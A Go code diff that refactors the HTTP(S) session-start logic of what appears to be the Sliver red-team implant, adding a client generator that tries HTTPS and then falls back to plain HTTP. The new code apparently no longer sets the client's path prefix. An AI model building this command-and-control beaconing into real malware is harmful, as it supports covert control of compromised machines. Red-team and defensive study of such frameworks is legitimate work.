@@ -121,32 +121,102 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 
 // HTTPStartSession - Attempts to start a session with a given address
 func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*SliverHTTPClient, error) {
-	var client *SliverHTTPClient
-	var err error
-	if !opts.ForceHTTP {
-		client = httpsClient(address, opts)
-		client.Options = opts
-		client.PathPrefix = pathPrefix
-		err = client.SessionInit()
-		if err == nil {
-			return client, nil
-		}
-	}
-	if err != nil || opts.ForceHTTP {
-		// If we're using default ports then switch to 80
-		if strings.HasSuffix(address, ":443") {
-			address = fmt.Sprintf("%s:80", address[:len(address)-4])
+	g := NewSliverHTTPClientGenerator(address, pathPrefix, opts)
+
+	for ok := g.Next(); ok; ok = g.Next() {
+		client := g.Value()
+
+		if err := client.SessionInit(); err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("XXX [HTTPStartSession] failed to initiate session: %v", err)
+			// {{end}}
+			continue
 		}
 
-		client = httpClient(address, opts) // Fallback to insecure HTTP
-		client.Options = opts
-		client.PathPrefix = pathPrefix
-		err = client.SessionInit()
-		if err != nil {
-			return nil, err
-		}
+		return client, nil
+
 	}
-	return client, nil
+
+	return nil, fmt.Errorf("failed to initiate session")
+}
+
+type SliverHTTPClientGenerator struct {
+	Address    string
+	PathPrefix string
+	Opts       *HTTPOptions
+
+	value *SliverHTTPClient
+
+	Strategies []SliverHTTPClientGenerationStrategy
+}
+
+func NewSliverHTTPClientGenerator(address string, pathPrefix string, opts *HTTPOptions) *SliverHTTPClientGenerator {
+	g := &SliverHTTPClientGenerator{
+		Address:    address,
+		PathPrefix: pathPrefix,
+		Opts:       opts,
+	}
+
+	g.Strategies = make([]SliverHTTPClientGenerationStrategy, 0)
+	for _, secure := range []bool{false, true} {
+		g.Strategies = append(g.Strategies, SliverHTTPClientGenerationStrategy{
+			Secure: secure,
+		})
+	}
+
+	return g
+}
+
+func (g *SliverHTTPClientGenerator) Next() bool {
+	for n := len(g.Strategies); n > 0; n = len(g.Strategies) {
+		var currentStrategy SliverHTTPClientGenerationStrategy
+		currentStrategy, g.Strategies = g.Strategies[n-1], g.Strategies[:n-1]
+
+		origin := g.GetOrigin(currentStrategy.Secure)
+		driver, err := GetHTTPDriver(origin, currentStrategy.Secure, g.Opts)
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("XXX [SliverHTTPClientGenerator] (Strategy: %+v) failed to initialize driver: %v", currentStrategy, err)
+			// {{end}}
+			continue
+		}
+
+		g.value = &SliverHTTPClient{
+			Origin:    origin,
+			driver:    driver,
+			pollMutex: &sync.Mutex{},
+			Closed:    false,
+			Options:   g.Opts,
+		}
+
+		return true
+	}
+
+	return false
+}
+
+func (g *SliverHTTPClientGenerator) Value() *SliverHTTPClient {
+	return g.value
+
+}
+
+func (g *SliverHTTPClientGenerator) GetOrigin(secure bool) string {
+	address := g.Address
+
+	if !secure && strings.HasSuffix(address, ":443") {
+		// If we're using default ports then switch to 80
+		address = fmt.Sprintf("%s:80", address[:len(address)-4])
+	}
+
+	if secure {
+		return fmt.Sprintf("https://%s", address)
+	} else {
+		return fmt.Sprintf("http://%s", address)
+	}
+}
+
+type SliverHTTPClientGenerationStrategy struct {
+	Secure bool
 }
 
 // HTTPDriver - The interface to send/recv HTTP data
@@ -626,46 +696,6 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 	// {{end}}
 	genSegments = append(genSegments, fmt.Sprintf("%s.%s", filename, ext))
 	return genSegments
-}
-
-// [ HTTP(S) Clients ] ------------------------------------------------------------
-
-func httpClient(address string, opts *HTTPOptions) *SliverHTTPClient {
-	origin := fmt.Sprintf("http://%s", address)
-	driver, err := GetHTTPDriver(origin, false, opts)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] failed to initialize driver: %v", err)
-		// {{end}}
-		return nil
-	}
-	client := &SliverHTTPClient{
-		Origin:    origin,
-		driver:    driver,
-		pollMutex: &sync.Mutex{},
-		Closed:    false,
-		Options:   opts,
-	}
-	return client
-}
-
-func httpsClient(address string, opts *HTTPOptions) *SliverHTTPClient {
-	origin := fmt.Sprintf("https://%s", address)
-	driver, err := GetHTTPDriver(origin, true, opts)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[http] failed to initialize driver: %v", err)
-		// {{end}}
-		return nil
-	}
-	client := &SliverHTTPClient{
-		Origin:    origin,
-		driver:    driver,
-		pollMutex: &sync.Mutex{},
-		Closed:    false,
-		Options:   opts,
-	}
-	return client
 }
 
 // {{end}} -HTTPc2Enabled
